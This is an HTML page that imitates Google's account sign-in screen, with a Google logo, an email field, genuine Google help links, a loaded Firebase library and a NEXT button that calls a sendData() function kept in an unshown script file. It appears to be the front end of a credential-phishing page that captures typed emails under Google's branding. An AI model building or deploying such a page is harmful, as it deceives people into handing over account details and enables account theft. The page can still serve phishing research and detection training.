<!DOCTYPE html>
<html>

<head>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <title>Google Sign up</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="Assets/favicon.ico">
    <script src="https://www.gstatic.com/firebasejs/5.2.0/firebase.js"></script>
</head>

<body>
    <div id="login">  
        <div id="loading">
            <div id="progress"></div>
        </div>
        
        <img src="Assets/google.png" width="70">
        <h1>Sign in</h1>
        <div id="account">
            <div id="accountimage">
                <img  width="20">
            </div>
            <div id="accounttext">
                <h2 id="logged">with your Google Account</h2>
            </div>
        </div>
        <br/>
        <div>
            <p id="animation">Email or phone</p>
            <input id="email" placeholder="Email or phone" autocomplete="off" autofocus onfocus="focused();" onfocusout="unfocused();">
        </div>
        <h3>
            <a href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forget email?</a>
        </h3>
        <br/>
        <p>Having a problem? Visit Google support for more information. <a href="https://support.google.com/accounts/troubleshooter/2402620?hl=en">Learn more</a></p>
		<div id="footer">
		    <div id="text">
                <h3><a href="https://accounts.google.com/signup/v2/webcreateaccount?hl=en&flowName=GlifWebSignIn&flowEntry=SignUp">Create account</a></h3>
            </div>
		    <div id="button">
                <button onclick="sendData();">NEXT</button>
            </div>
        </div>
    </div>

    <script type="text/javascript" src="script.js"></script>
</body>

</html>
